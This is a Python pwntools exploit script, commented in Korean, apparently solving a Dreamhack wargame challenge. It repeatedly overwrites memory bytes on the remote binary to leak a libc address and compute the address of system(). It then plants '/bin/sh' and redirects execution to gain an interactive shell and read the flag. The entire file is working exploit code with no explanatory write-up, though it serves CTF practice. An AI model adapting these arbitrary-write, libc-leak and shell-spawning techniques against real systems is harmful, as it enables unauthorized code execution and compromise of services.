from pwn import *
from time import sleep

context.log_level = 'debug'

host = 'host3.dreamhack.games'
port = 22169 # 서버 주소에 맞게 포트를 변경하세요.

p = remote(host, port)

# PPT 원본 overwrite 함수 그대로 사용 (안정성을 위해 딜레이만 살짝 추가)
def overwrite(a, b):
    p.sendline(f'{str(int(a))[::-1]}'.encode())
    sleep(0.1)
    p.sendline(f'{str(int(b))[::-1]}'.encode())
    sleep(0.1)

try:
    print("\n[DEBUG] ------- 카나리 덮기 ----------")
    overwrite(0xf6, 0x6009c0)
    overwrite(0xf6, 0x600bc8)
    overwrite(4, 0x6009b8)
    overwrite(0xDA, 0x600bc8)
    overwrite(4, 0x600bc8)
    overwrite(6, 0x600bc9)

    print("\n[DEBUG] ------------ libc leak 시작 ----------")
    overwrite(0xce, 0x600bd0)
    overwrite(0x5, 0x600bd1) # PPT 오타 1글자만 수정 (be1 -> bd1)
    overwrite(0x40, 0x600bd2)
    overwrite(0x0, 0x600bd3)
    overwrite(0x0, 0x600bd4)
    overwrite(0x0, 0x600bd5)
    
    overwrite(0xf6, 0x600b98)
    overwrite(0x5, 0x600b99)
    overwrite(0x40, 0x600b9a)
    overwrite(0x0, 0x600b9b)
    overwrite(0x0, 0x600b9c)
    overwrite(0x0, 0x600b9d)
    
    overwrite(0x8, 0x600c00)
    overwrite(0x64, 0x600bc8)

    print("\n[DEBUG] -> 서버로부터 Libc 주소 누출 대기 중...")
    leak_data = p.recvuntil(b'\x7f')
    leaked_addr = u64(leak_data[-6:].ljust(8, b'\x00'))
    
    # 릭된 포인터 기반 정확한 Base 계산
    libc_base = leaked_addr - 0x3ec8b0
    
    # 다운받은 libc-2.27.so를 통해 정확한 system 주소(0x4f420) 추출
    libc = ELF('./libc-2.27.so')
    system_addr = libc_base + libc.symbols['system']

    print(f"\n[SUCCESS] ✨ Leaked Pointer : {hex(leaked_addr)}")
    print(f"[SUCCESS] 🗺️ Libc Base : {hex(libc_base)}")
    print(f"[SUCCESS] 🎯 System Addr: {hex(system_addr)}")

    bytes_list = list(system_addr.to_bytes(8, 'little'))
    
    print("\n[DEBUG] -> 루프 복구")
    overwrite(4, 0x600BC8)

    print("\n[DEBUG] -> PPT 원본 페이로드 시작")
    for i in range(6):
        overwrite(bytes_list[i], 0x600BD0+i)

    binsh = [0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00]
    for i in range(7):
        overwrite(binsh[i],0x600C10+i)
    stdin = [0x10,0x0c,0x60,0x00,0x00,0x00,0x00,0x00]
    for i in range(7):
        overwrite(stdin[i],0x600c00+i)
    slep = [0xf6,0x05,0x40,0x00,0x00,0x00,0x00,0x00]
    for i in range(7):
        overwrite(slep[i],0x600BE0+i)
    overwrite(0xa9,0x600B98)
    overwrite(0x64,0x600BC8)

    print("\n[SUCCESS] 🎉 Interactive 쉘 진입!")
    p.sendline(b'cat flag; cat flag.txt') # 쉘 따지자마자 플래그 출력
    p.interactive()

except Exception as e:
    print(f"\n[ERROR] 예외 발생: {e}")